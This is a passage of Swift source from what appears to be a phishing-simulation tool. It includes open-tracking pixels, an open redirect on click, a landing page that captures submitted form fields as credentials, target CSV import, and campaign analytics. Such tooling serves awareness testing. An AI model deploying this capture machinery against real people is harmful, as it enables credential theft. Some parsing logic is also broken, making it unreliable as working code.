        let buffer = UnsafeMutablePointer<UInt8>.allocate(capacity: 1024)
        defer { buffer.deallocate() }
        
        let bytesRead = inputStream.read(buffer, maxLength: 1024)
        guard bytesRead > 0 else {
            throw SMTPError.connectionFailed("Failed to read response")
        }
        
        let response = String(bytes: UnsafeBufferPointer(start: buffer, count: bytesRead), encoding: .utf8) ?? ""
        
        if !response.hasPrefix(expectedCode) {
            throw SMTPError.sendFailed("Unexpected response: \(response)")
        }
    }
}

struct EmailMessage {
    let headers: [String: String]
    let body: String
    
    var senderEmail: String {
        return extractEmail(from: headers["From"] ?? "")
    }
    
    var recipientEmail: String {
        return extractEmail(from: headers["To"] ?? "")
    }
    
    func serialize() -> String {
        var message = ""
        
        // Add headers
        for (key, value) in headers {
            message += "\(key): \(value)\r\n"
        }
        
        // Add empty line separator
        message += "\r\n"
        
        // Add body
        message += body
        
        return message
    }
    
    private func extractEmail(from field: String) -> String {
        // Extract email from "Name <email@domain.com>" format
        if let range = field.range(of: "<(.*)>", options: .regularExpression) {
            return String(field[range]).replacingOccurrences(of: "<", with: "").replacingOccurrences(of: ">", with: "")
        }
        return field
    }
}

class RFC2822DateFormatter {
    private static let formatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.dateFormat = "EEE, dd MMM yyyy HH:mm:ss Z"
        formatter.locale = Locale(identifier: "en_US_POSIX")
        return formatter
    }()
    
    static func string(from date: Date) -> String {
        return formatter.string(from: date)
    }
}

// MARK: - Tracking Server

class TrackingServer {
    private var campaignEndpoints: [UUID: CampaignEndpoint] = [:]
    private var trackingData: [UUID: [TargetInteraction]] = [:]
    private var httpServer: HTTPServer?
    private let dataStore = SecureTrackingDataStore()
    
    init() {
        setupHTTPServer()
    }
    
    private func setupHTTPServer() {
        httpServer = HTTPServer()
        
        // Set up pixel tracking endpoint
        httpServer?.addRoute("/pixel/:trackingId") { [weak self] (request: SocialEngineeringHTTPRequest) in
            let trackingId = request.pathParameters["trackingId"] ?? ""
            let interaction = TrackingRequest(
                ipAddress: request.remoteAddress,
                userAgent: request.headers["User-Agent"] ?? "",
                timestamp: Date()
            )
            
            await self?.handlePixelRequest(trackingId: trackingId, request: interaction)
            
            // Return 1x1 transparent GIF
            let pixelData = Data(base64Encoded: "R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==") ?? Data()
            return SocialEngineeringHTTPResponse(
                statusCode: 200,
                headers: ["Content-Type": "image/gif", "Cache-Control": "no-cache"],
                body: pixelData
            )
        }
        
        // Set up click tracking endpoint
        httpServer?.addRoute("/click/:trackingId") { [weak self] (request: SocialEngineeringHTTPRequest) in
            let trackingId = request.pathParameters["trackingId"] ?? ""
            let targetUrl = request.queryParameters["url"] ?? ""
            
            let interaction = TrackingRequest(
                ipAddress: request.remoteAddress,
                userAgent: request.headers["User-Agent"] ?? "",
                timestamp: Date()
            )
            
            await self?.handleClickRequest(trackingId: trackingId, url: targetUrl, request: interaction)
            
            // Redirect to target URL
            return SocialEngineeringHTTPResponse(
                statusCode: 302,
                headers: ["Location": targetUrl],
                body: Data()
            )
        }
        
        // Set up landing page endpoint
        httpServer?.addRoute("/landing/:trackingId", method: HTTPMethod.POST) { [weak self] (request: SocialEngineeringHTTPRequest) in
            let trackingId = request.pathParameters["trackingId"] ?? ""
            var formData: [String: String] = [:]
            
            // Parse form data from request body
            if let bodyString = String(data: request.body, encoding: .utf8) {
                formData = self?.parseFormData(bodyString) ?? [:]
            }
            
            let interaction = TrackingRequest(
                ipAddress: request.remoteAddress,
                userAgent: request.headers["User-Agent"] ?? "",
                timestamp: Date()
            )
            
            await self?.handleLandingPageRequest(trackingId: trackingId, formData: formData, request: interaction)
            
            return SocialEngineeringHTTPResponse(
                statusCode: 200,
                headers: ["Content-Type": "application/json"],
                body: "{\"success\": true}".data(using: .utf8) ?? Data()
            )
        }
    }
    
    func startServer(port: Int = 8080) throws {
        try httpServer?.start(port: port)
    }
    
    func stopServer() {
        httpServer?.stop()
    }
    
    func setupCampaignEndpoints(_ campaign: PhishingCampaign) async {
        let endpoint = CampaignEndpoint(
            campaign: campaign,
            pixelHandler: handlePixelRequest,
            clickHandler: handleClickRequest,
            landingPageHandler: handleLandingPageRequest
        )
        
        campaignEndpoints[campaign.id] = endpoint
        trackingData[campaign.id] = []
        
        // Store campaign tracking setup in persistent storage
        await dataStore.createCampaignTrackingRecord(campaign)
    }
    
    func logInteraction(campaignId: UUID, targetId: UUID, action: TargetInteraction.InteractionType, details: [String: String]) {
        let interaction = TargetInteraction(
            timestamp: Date(),
            action: action,
            ipAddress: details["ipAddress"] ?? "unknown",
            userAgent: details["userAgent"] ?? "unknown",
            location: nil,
            details: details
        )
        
        trackingData[campaignId]?.append(interaction)
        
        // Store interaction in persistent storage
        Task {
            await dataStore.storeInteraction(campaignId: campaignId, targetId: targetId, interaction: interaction)
        }
        
        // Update target status in real-time
        Task { @MainActor in
            updateTargetStatus(campaignId: campaignId, targetId: targetId, action: action)
        }
    }
    
    private func updateTargetStatus(campaignId: UUID, targetId: UUID, action: TargetInteraction.InteractionType) {
        // This should update the actual campaign data in the SocialEngineeringManager
        NotificationCenter.default.post(
            name: .targetStatusUpdated,
            object: nil,
            userInfo: [
                "campaignId": campaignId,
                "targetId": targetId,
                "action": action
            ]
        )
    }
    
    private func parseFormData(_ bodyString: String) -> [String: String] {
        var formData: [String: String] = [:]
        let pairs = bodyString.components(separatedBy: "&")
        
        for pair in pairs {
            let components = pair.components(separatedBy: "=")
            if components.count == 2 {
                let key = components[0].removingPercentEncoding ?? components[0]
                let value = components[1].removingPercentEncoding ?? components[1]
                formData[key] = value
            }
        }
        
        return formData
    }
    
    private func handlePixelRequest(trackingId: String, request: TrackingRequest) async {
        // Log email open event
        if let (campaignId, targetId) = decodeTrackingId(trackingId) {
            logInteraction(
                campaignId: campaignId,
                targetId: targetId,
                action: .emailOpened,
                details: [:]
            )
        }
    }
    
    private func handleClickRequest(trackingId: String, url: String, request: TrackingRequest) async {
        // Log link click event
        if let (campaignId, targetId) = decodeTrackingId(trackingId) {
            logInteraction(
                campaignId: campaignId,
                targetId: targetId,
                action: .linkClicked,
                details: ["url": url]
            )
        }
    }
    
    private func handleLandingPageRequest(trackingId: String, formData: [String: String]?, request: TrackingRequest) async {
        // Log landing page interaction
        if let (campaignId, targetId) = decodeTrackingId(trackingId) {
            if let formData = formData, !formData.isEmpty {
                logInteraction(
                    campaignId: campaignId,
                    targetId: targetId,
                    action: .credentialsEntered,
                    details: formData
                )
            } else {
                logInteraction(
                    campaignId: campaignId,
                    targetId: targetId,
                    action: .pageVisited,
                    details: [:]
                )
            }
        }
    }
    
    private func decodeTrackingId(_ trackingId: String) -> (campaignId: UUID, targetId: UUID)? {
        guard let data = Data(base64Encoded: trackingId),
              let string = String(data: data, encoding: .utf8) else { return nil }
        
        let parts = string.split(separator: "-")
        guard parts.count >= 5, // UUID format has 5 parts
              let campaignId = UUID(uuidString: String(parts[0...4].joined(separator: "-"))),
              let targetId = UUID(uuidString: String(parts[5...9].joined(separator: "-"))) else { return nil }
        
        return (campaignId, targetId)
    }
}

// MARK: - Analytics Engine

class PhishingAnalyticsEngine {
    func generateAnalytics(for campaign: PhishingCampaign) -> CampaignAnalytics {
        var analytics = CampaignAnalytics()
        
        // Calculate basic metrics
        analytics.totalTargets = campaign.targets.count
        analytics.emailsSent = campaign.targets.filter { $0.status != .pending }.count
        analytics.emailsOpened = campaign.targets.filter { $0.emailOpenedAt != nil }.count
        analytics.linksClicked = campaign.targets.filter { $0.linkClickedAt != nil }.count
        analytics.credentialsSubmitted = campaign.targets.filter { $0.credentialsSubmittedAt != nil }.count
        analytics.reported = campaign.targets.filter { $0.reportedAsPhishingAt != nil }.count
        
        // Calculate time-based metrics
        analytics.averageTimeToOpen = calculateAverageTime(
            targets: campaign.targets,
            startTime: \.emailSentAt,
            endTime: \.emailOpenedAt
        )
        
        analytics.averageTimeToClick = calculateAverageTime(
            targets: campaign.targets,
            startTime: \.emailOpenedAt,
            endTime: \.linkClickedAt
        )
        
        analytics.averageTimeToSubmit = calculateAverageTime(
            targets: campaign.targets,
            startTime: \.linkClickedAt,
            endTime: \.credentialsSubmittedAt
        )
        
        // Department analysis
        analytics.departmentBreakdown = analyzeDepartments(campaign.targets)
        
        // Risk score calculation
        analytics.overallRiskScore = calculateRiskScore(campaign)
        
        return analytics
    }
    
    private func calculateAverageTime(
        targets: [PhishingTarget],
        startTime: KeyPath<PhishingTarget, Date?>,
        endTime: KeyPath<PhishingTarget, Date?>
    ) -> TimeInterval? {
        let validTargets = targets.compactMap { target -> TimeInterval? in
            guard let start = target[keyPath: startTime],
                  let end = target[keyPath: endTime] else { return nil }
            return end.timeIntervalSince(start)
        }
        
        guard !validTargets.isEmpty else { return nil }
        return validTargets.reduce(0, +) / Double(validTargets.count)
    }
    
    private func analyzeDepartments(_ targets: [PhishingTarget]) -> [String: DepartmentMetrics] {
        var breakdown: [String: DepartmentMetrics] = [:]
        
        for target in targets {
            let dept = target.department ?? "Unknown"
            var metrics = breakdown[dept] ?? DepartmentMetrics()
            
            metrics.totalTargets += 1
            if target.emailOpenedAt != nil { metrics.opened += 1 }
            if target.linkClickedAt != nil { metrics.clicked += 1 }
            if target.credentialsSubmittedAt != nil { metrics.submitted += 1 }
            if target.reportedAsPhishingAt != nil { metrics.reported += 1 }
            
            breakdown[dept] = metrics
        }
        
        return breakdown
    }
    
    private func calculateRiskScore(_ campaign: PhishingCampaign) -> Double {
        let metrics = campaign.metrics
        
        // Weight factors for risk calculation
        let clickWeight = 0.3
        let submitWeight = 0.5
        let reportWeight = -0.2 // Negative because reporting is good
        
        let clickRate = metrics.clickRate / 100
        let submitRate = metrics.submissionRate / 100
        let reportRate = metrics.reportRate / 100
        
        let riskScore = (clickRate * clickWeight) + 
                       (submitRate * submitWeight) + 
                       (reportRate * reportWeight)
        
        return min(max(riskScore * 100, 0), 100) // Normalize to 0-100
    }
}

// MARK: - Email Validator

class EmailValidator {
    func isValid(_ email: String) -> Bool {
        let emailRegex = #"^[A-Z0-9a-z._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,64}$"#
        let emailPredicate = NSPredicate(format: "SELF MATCHES %@", emailRegex)
        return emailPredicate.evaluate(with: email)
    }
}

// MARK: - Data Store

class SocialEngineeringDataStore {
    let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
    
    func loadCampaigns() -> [PhishingCampaign] {
        let url = documentsDirectory.appendingPathComponent("phishing_campaigns.json")
        guard let data = try? Data(contentsOf: url),
              let campaigns = try? JSONDecoder().decode([PhishingCampaign].self, from: data) else {
            return []
        }
        return campaigns
    }
    
    func saveCampaigns(_ campaigns: [PhishingCampaign]) {
        let url = documentsDirectory.appendingPathComponent("phishing_campaigns.json")
        if let data = try? JSONEncoder().encode(campaigns) {
            try? data.write(to: url)
        }
    }
    
    func loadEmailTemplates() -> [EmailTemplate] {
        let url = documentsDirectory.appendingPathComponent("email_templates.json")
        guard let data = try? Data(contentsOf: url),
              let templates = try? JSONDecoder().decode([EmailTemplate].self, from: data) else {
            return []
        }
        return templates
    }
    
    func saveEmailTemplates(_ templates: [EmailTemplate]) {
        let url = documentsDirectory.appendingPathComponent("email_templates.json")
        if let data = try? JSONEncoder().encode(templates) {
            try? data.write(to: url)
        }
    }
    
    func loadLandingPageTemplates() -> [LandingPageTemplate] {
        let url = documentsDirectory.appendingPathComponent("landing_templates.json")
        guard let data = try? Data(contentsOf: url),
              let templates = try? JSONDecoder().decode([LandingPageTemplate].self, from: data) else {
            return []
        }
        return templates
    }
    
    func saveLandingPageTemplates(_ templates: [LandingPageTemplate]) {
        let url = documentsDirectory.appendingPathComponent("landing_templates.json")
        if let data = try? JSONEncoder().encode(templates) {
            try? data.write(to: url)
        }
    }
    
    func loadSendingProfiles() -> [SendingProfile] {
        let url = documentsDirectory.appendingPathComponent("sending_profiles.json")
        guard let data = try? Data(contentsOf: url),
              let profiles = try? JSONDecoder().decode([SendingProfile].self, from: data) else {
            return []
        }
        return profiles
    }
}

// MARK: - CSV Target Parser

struct CSVTargetParser {
    static func parse(_ csvString: String) throws -> [PhishingTarget] {
        let lines = csvString.components(separatedBy: .newlines)
        guard let headerLine = lines.first else {
            throw ParseError.emptyFile
        }
        
        let headers = headerLine.components(separatedBy: ",").map { $0.trimmingCharacters(in: .whitespaces) }
        
        var targets: [PhishingTarget] = []
        
        for (index, line) in lines.dropFirst().enumerated() where !line.isEmpty {
            let values = parseCSVLine(line)
            
            guard values.count == headers.count else {
                throw ParseError.invalidRow(index + 1)
            }
            
            var customFields: [String: String] = [:]
            var email = ""
            var firstName = ""
            var lastName = ""
            var department: String?
            var position: String?
            
            for (header, value) in zip(headers, values) {
                switch header.lowercased() {
                case "email", "e-mail", "emailaddress":
                    email = value
                case "firstname", "first name", "first":
                    firstName = value
                case "lastname", "last name", "last":
                    lastName = value
                case "department", "dept":
                    department = value
                case "position", "title", "jobtitle":
                    position = value
                default:
                    customFields[header] = value
                }
            }
            
            guard !email.isEmpty else {
                throw ParseError.missingEmail(index + 1)
            }
            
            let target = PhishingTarget(
                email: email,
                firstName: firstName,
                lastName: lastName,
                department: department,
                position: position,
                customFields: customFields,
                status: .pending,
                emailSentAt: nil,
                emailOpenedAt: nil,
                linkClickedAt: nil,
                credentialsSubmittedAt: nil,
                reportedAsPhishingAt: nil,
                interactions: []
            )
            
            targets.append(target)
        }
        
        return targets
    }
    
    private static func parseCSVLine(_ line: String) -> [String] {
        var values: [String] = []
        var currentValue = ""
        var inQuotes = false
        
        for char in line {
            if char == "\"" {
                inQuotes.toggle()
            } else if char == "," && !inQuotes {
                values.append(currentValue.trimmingCharacters(in: .whitespaces))
                currentValue = ""
            } else {
                currentValue.append(char)
            }
        }
        
        values.append(currentValue.trimmingCharacters(in: .whitespaces))
        return values
    }
    
    enum ParseError: LocalizedError {
        case emptyFile
        case invalidRow(Int)
        case missingEmail(Int)
        
        var errorDescription: String? {
            switch self {
            case .emptyFile:
                return "CSV file is empty"
            case .invalidRow(let row):
                return "Invalid data at row \(row)"
            case .missingEmail(let row):
                return "Missing email address at row \(row)"
            }
        }
    }
}

// MARK: - Error Types

enum CampaignError: LocalizedError {
    case campaignNotFound
    case invalidStatus
    case noTargets
    case smtpConnectionFailed
    case templateNotFound
    case noSendingProfile
    case invalidTargetEmail(String)
    
    var errorDescription: String? {
        switch self {
        case .campaignNotFound:
            return "Campaign not found"
        case .invalidStatus:
            return "Campaign is not in the correct status for this operation"
        case .noTargets:
            return "Campaign has no targets"
        case .smtpConnectionFailed:
            return "Failed to connect to SMTP server"
        case .templateNotFound:
            return "Email or landing page template not found"
        case .noSendingProfile:
            return "No sending profile configured"
        case .invalidTargetEmail(let email):
            return "Invalid email address: \(email)"
        }
    }
}

enum SMTPError: LocalizedError {
    case connectionFailed(String)
    case authenticationFailed
    case sendFailed(String)
    
    var errorDescription: String? {
        switch self {
        case .connectionFailed(let message):
            return "SMTP connection failed: \(message)"
        case .authenticationFailed:
            return "SMTP authentication failed"
        case .sendFailed(let message):
            return "Failed to send email: \(message)"
        }
    }
}

// MARK: - HTTP Server Implementation

class HTTPServer {
    private var routes: [HTTPRoute] = []
    private var isRunning = false
    private var server: NWListener?
    
    func addRoute(_ path: String, method: HTTPMethod = HTTPMethod.GET, handler: @escaping (SocialEngineeringHTTPRequest) async -> SocialEngineeringHTTPResponse) {
        routes.append(HTTPRoute(path: path, method: method, handler: handler))
    }
    
    func start(port: Int) throws {
        let parameters = NWParameters.tcp
        parameters.allowLocalEndpointReuse = true
        
        server = try NWListener(using: parameters, on: NWEndpoint.Port(rawValue: UInt16(port))!)
        
        server?.newConnectionHandler = { [weak self] connection in
            self?.handleConnection(connection)
        }
        
        server?.start(queue: .global())
        isRunning = true
    }
    
    func stop() {
        server?.cancel()
        isRunning = false
    }
    
    private func handleConnection(_ connection: NWConnection) {
        connection.start(queue: .global())
        
        connection.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] data, _, isComplete, error in
            if let data = data, !data.isEmpty {
                Task {
                    let response = await self?.processRequest(data) ?? Self.notFoundResponse()
                    let responseData = response.serialize()
                    
                    connection.send(content: responseData, completion: .contentProcessed { _ in
                        connection.cancel()
                    })
                }
            }
            
            if isComplete {
                connection.cancel()
            }
        }
    }
    
    private func processRequest(_ data: Data) async -> SocialEngineeringHTTPResponse {
        guard let requestString = String(data: data, encoding: .utf8) else {
            return SocialEngineeringHTTPResponse.badRequest()
        }
        
        let request = SocialEngineeringHTTPRequest.parse(requestString)
        
        // Find matching route
        for route in routes {
            if route.matches(request) {
                return await route.handler(request)
            }
        }
        
        return Self.notFoundResponse()
    }
    
    static func notFoundResponse() -> SocialEngineeringHTTPResponse {
        return SocialEngineeringHTTPResponse(
            statusCode: 404,
            headers: ["Content-Type": "text/plain"],
            body: "Not Found".data(using: .utf8) ?? Data()
        )
    }
}

struct HTTPRoute {
    let path: String
    let method: HTTPMethod
    let handler: (SocialEngineeringHTTPRequest) async -> SocialEngineeringHTTPResponse
    
    func matches(_ request: SocialEngineeringHTTPRequest) -> Bool {
        return request.method == method && pathMatches(request.path)
    }
    
    private func pathMatches(_ requestPath: String) -> Bool {
        let pathComponents = path.components(separatedBy: "/")
        let requestComponents = requestPath.components(separatedBy: "/")
        
        guard pathComponents.count == requestComponents.count else { return false }
        
        for (pathComponent, requestComponent) in zip(pathComponents, requestComponents) {
            if pathComponent.hasPrefix(":") {
                continue // Parameter match
            } else if pathComponent != requestComponent {
                return false
            }
        }
        
        return true
    }
}

enum HTTPMethod: String {
    case GET = "GET"
    case POST = "POST"
    case PUT = "PUT"
    case DELETE = "DELETE"
}

struct SocialEngineeringHTTPRequest {
    let method: HTTPMethod
    let path: String
    let headers: [String: String]
    let queryParameters: [String: String]
    let pathParameters: [String: String]
    let body: Data
    let remoteAddress: String
    
    static func parse(_ requestString: String) -> SocialEngineeringHTTPRequest {
        let lines = requestString.components(separatedBy: "\r\n")
        guard let firstLine = lines.first else {
            return SocialEngineeringHTTPRequest(method: HTTPMethod.GET, path: "/", headers: [:], queryParameters: [:], pathParameters: [:], body: Data(), remoteAddress: "unknown")
        }
        
        let requestLineComponents = firstLine.components(separatedBy: " ")
        let method = HTTPMethod(rawValue: requestLineComponents[0]) ?? HTTPMethod.GET
        let fullPath = requestLineComponents.count > 1 ? requestLineComponents[1] : "/"
        
        // Parse path and query parameters
        let pathComponents = fullPath.components(separatedBy: "?")
        let path = pathComponents[0]
        var queryParameters: [String: String] = [:]
        
        if pathComponents.count > 1 {
            let queryString = pathComponents[1]
            let pairs = queryString.components(separatedBy: "&")
            for pair in pairs {
                let keyValue = pair.components(separatedBy: "=")
                if keyValue.count == 2 {
                    queryParameters[keyValue[0]] = keyValue[1].removingPercentEncoding
                }
            }
        }
        
        // Parse headers
        var headers: [String: String] = [:]
        var bodyStartIndex = 0
        
        for (index, line) in lines.enumerated() {
            if line.isEmpty {
                bodyStartIndex = index + 1
                break
            }
            
            if index > 0 { // Skip request line
                let headerComponents = line.components(separatedBy: ": ")
                if headerComponents.count >= 2 {
                    headers[headerComponents[0]] = headerComponents.dropFirst().joined(separator: ": ")
                }
            }
        }
        
        // Parse body
        let bodyLines = Array(lines.dropFirst(bodyStartIndex))
        let bodyString = bodyLines.joined(separator: "\r\n")
        let body = bodyString.data(using: .utf8) ?? Data()
        
        return SocialEngineeringHTTPRequest(
            method: method,
            path: path,
            headers: headers,
            queryParameters: queryParameters,
            pathParameters: [:], // Would be populated by route matching
            body: body,
            remoteAddress: "127.0.0.1" // Would be extracted from connection
        )
    }
}

struct SocialEngineeringHTTPResponse {
    let statusCode: Int
    let headers: [String: String]
    let body: Data
    
    func serialize() -> Data {
        var response = "HTTP/1.1 \(statusCode) \(statusMessage)\r\n"
        
        for (key, value) in headers {
            response += "\(key): \(value)\r\n"
        }
        
        response += "Content-Length: \(body.count)\r\n"
        response += "\r\n"
        
        var responseData = response.data(using: .utf8) ?? Data()
        responseData.append(body)
        
        return responseData
    }
    
    private var statusMessage: String {
        switch statusCode {
        case 200: return "OK"
        case 302: return "Found"
        case 400: return "Bad Request"
        case 404: return "Not Found"
        case 500: return "Internal Server Error"
        default: return "Unknown"
        }
    }
    
    static func notFound() -> SocialEngineeringHTTPResponse {
        return SocialEngineeringHTTPResponse(
            statusCode: 404,
            headers: ["Content-Type": "text/plain"],
            body: "Not Found".data(using: .utf8) ?? Data()
        )
    }
    
    static func badRequest() -> SocialEngineeringHTTPResponse {
        return SocialEngineeringHTTPResponse(
            statusCode: 400,
            headers: ["Content-Type": "text/plain"],
            body: "Bad Request".data(using: .utf8) ?? Data()
        )
    }
}

// MARK: - Tracking Data Store

class TrackingDataStore {
    let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
    
    func createCampaignTrackingRecord(_ campaign: PhishingCampaign) async {
        let trackingRecord = CampaignTrackingRecord(
            campaignId: campaign.id,
            campaignName: campaign.name,
            createdAt: Date(),
            interactions: []
        )
        
        await saveTrackingRecord(trackingRecord)
    }
    
    func storeInteraction(campaignId: UUID, targetId: UUID, interaction: TargetInteraction) async {
        var record = await loadTrackingRecord(campaignId: campaignId) ?? CampaignTrackingRecord(
            campaignId: campaignId,
            campaignName: "Unknown",
            createdAt: Date(),
            interactions: []
        )
        
        let trackedInteraction = TrackedInteraction(
            targetId: targetId,
            interaction: interaction
        )
        
        record.interactions.append(trackedInteraction)
        await saveTrackingRecord(record)
    }
    
    func loadTrackingRecord(campaignId: UUID) async -> CampaignTrackingRecord? {
        let url = documentsDirectory.appendingPathComponent("tracking_\(campaignId.uuidString).json")
        
        guard let data = try? Data(contentsOf: url),
              let record = try? JSONDecoder().decode(CampaignTrackingRecord.self, from: data) else {
            return nil
        }
        
        return record
    }
    
    func saveTrackingRecord(_ record: CampaignTrackingRecord) async {
        let url = documentsDirectory.appendingPathComponent("tracking_\(record.campaignId.uuidString).json")
        
        if let data = try? JSONEncoder().encode(record) {
            try? data.write(to: url)
        }
    }
}

struct CampaignTrackingRecord: Codable {
    let campaignId: UUID
    let campaignName: String
    let createdAt: Date
    var interactions: [TrackedInteraction]
}

struct TrackedInteraction: Codable {
    let targetId: UUID
    let interaction: TargetInteraction
}

struct TrackingRequest {
    let ipAddress: String
    let userAgent: String
    let timestamp: Date
}

// MARK: - Credential Encryption

import CryptoKit

class CredentialEncryption {
    private static let keyTag = "com.donktool.socialengineering.key"
    
    static func encrypt(_ data: Data) throws -> Data {
        let key = try getOrCreateKey()
        let sealedBox = try AES.GCM.seal(data, using: key)
        return sealedBox.combined!
    }
    
    static func decrypt(_ encryptedData: Data) throws -> Data {
        let key = try getOrCreateKey()
        let sealedBox = try AES.GCM.SealedBox(combined: encryptedData)
        return try AES.GCM.open(sealedBox, using: key)
    }
    
    static func encryptString(_ string: String) throws -> Data {
        guard let data = string.data(using: .utf8) else {
            throw EncryptionError.invalidData
        }
        return try encrypt(data)
    }
    
    static func decryptString(_ encryptedData: Data) throws -> String {
        let data = try decrypt(encryptedData)
        guard let string = String(data: data, encoding: .utf8) else {
            throw EncryptionError.invalidData
        }
        return string
    }
    
    private static func getOrCreateKey() throws -> SymmetricKey {
        // Try to load existing key from Keychain
        if let keyData = loadKeyFromKeychain() {
            return SymmetricKey(data: keyData)
        }
        
        // Create new key and store in Keychain
        let key = SymmetricKey(size: .bits256)
        try storeKeyInKeychain(key.withUnsafeBytes { bytes in
            Data(bytes)
        })
        
        return key
    }
    
    private static func loadKeyFromKeychain() -> Data? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: keyTag,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne
        ]
        
        var result: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &result)
        
        guard status == errSecSuccess else {
            return nil
        }
        
        return result as? Data
    }
    
    private static func storeKeyInKeychain(_ keyData: Data) throws {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: keyTag,
            kSecValueData as String: keyData
        ]
        
        // Delete existing key if it exists
        SecItemDelete(query as CFDictionary)
        
        let status = SecItemAdd(query as CFDictionary, nil)
        guard status == errSecSuccess else {
            throw EncryptionError.keychainError(status)
        }
    }
}

enum EncryptionError: LocalizedError {
    case invalidData
    case keychainError(OSStatus)
    
    var errorDescription: String? {
        switch self {
        case .invalidData:
            return "Invalid data for encryption/decryption"
        case .keychainError(let status):
            return "Keychain error: \(status)"
        }
    }
}

// MARK: - Secure Data Store

class SecureSocialEngineeringDataStore: SocialEngineeringDataStore {
    override func saveCampaigns(_ campaigns: [PhishingCampaign]) {
        do {
            let data = try JSONEncoder().encode(campaigns)
            let encryptedData = try CredentialEncryption.encrypt(data)
            
            let url = self.documentsDirectory.appendingPathComponent("phishing_campaigns_encrypted.data")
            try encryptedData.write(to: url)
        } catch {
            print("Failed to save encrypted campaigns: \(error)")
            // Fallback to unencrypted storage
            super.saveCampaigns(campaigns)
        }
    }
    
    override func loadCampaigns() -> [PhishingCampaign] {
        do {
            let url = documentsDirectory.appendingPathComponent("phishing_campaigns_encrypted.data")
            let encryptedData = try Data(contentsOf: url)
            let data = try CredentialEncryption.decrypt(encryptedData)
            let campaigns = try JSONDecoder().decode([PhishingCampaign].self, from: data)
            return campaigns
        } catch {
            print("Failed to load encrypted campaigns: \(error)")
            // Fallback to unencrypted storage
            return super.loadCampaigns()
        }
    }
    
    override func saveEmailTemplates(_ templates: [EmailTemplate]) {
        do {
            let data = try JSONEncoder().encode(templates)
            let encryptedData = try CredentialEncryption.encrypt(data)
            
            let url = documentsDirectory.appendingPathComponent("email_templates_encrypted.data")
            try encryptedData.write(to: url)
        } catch {
            print("Failed to save encrypted templates: \(error)")
            super.saveEmailTemplates(templates)
        }
    }
    
    override func loadEmailTemplates() -> [EmailTemplate] {
        do {
            let url = documentsDirectory.appendingPathComponent("email_templates_encrypted.data")
            let encryptedData = try Data(contentsOf: url)
            let data = try CredentialEncryption.decrypt(encryptedData)
            let templates = try JSONDecoder().decode([EmailTemplate].self, from: data)
            return templates
        } catch {
            print("Failed to load encrypted templates: \(error)")
            return super.loadEmailTemplates()
        }
    }
    
    override func loadSendingProfiles() -> [SendingProfile] {
        do {
            let url = documentsDirectory.appendingPathComponent("sending_profiles_encrypted.data")
            let encryptedData = try Data(contentsOf: url)
            let data = try CredentialEncryption.decrypt(encryptedData)
            let profiles = try JSONDecoder().decode([SendingProfile].self, from: data)
            return profiles
        } catch {
            print("Failed to load encrypted profiles: \(error)")
            return []
        }
    }
    
    func saveSendingProfiles(_ profiles: [SendingProfile]) {
        do {
            let data = try JSONEncoder().encode(profiles)
            let encryptedData = try CredentialEncryption.encrypt(data)
            
            let url = documentsDirectory.appendingPathComponent("sending_profiles_encrypted.data")
            try encryptedData.write(to: url)
        } catch {
            print("Failed to save encrypted profiles: \(error)")
        }
    }
}

// MARK: - Secure Tracking Data Store

class SecureTrackingDataStore: TrackingDataStore {
    override func saveTrackingRecord(_ record: CampaignTrackingRecord) async {
        do {
            let data = try JSONEncoder().encode(record)
            let encryptedData = try CredentialEncryption.encrypt(data)
            
            let url = documentsDirectory.appendingPathComponent("tracking_\(record.campaignId.uuidString)_encrypted.data")
            try encryptedData.write(to: url)
        } catch {
            print("Failed to save encrypted tracking record: \(error)")
            await super.saveTrackingRecord(record)
        }
    }
    
    override func loadTrackingRecord(campaignId: UUID) async -> CampaignTrackingRecord? {
        do {
            let url = documentsDirectory.appendingPathComponent("tracking_\(campaignId.uuidString)_encrypted.data")
            let encryptedData = try Data(contentsOf: url)
            let data = try CredentialEncryption.decrypt(encryptedData)
            let record = try JSONDecoder().decode(CampaignTrackingRecord.self, from: data)
            return record
        } catch {
            print("Failed to load encrypted tracking record: \(error)")
            return await super.loadTrackingRecord(campaignId: campaignId)
        }
    }
}

// MARK: - Notification Extensions

extension Notification.Name {
    static let targetStatusUpdated = Notification.Name("targetStatusUpdated")
}
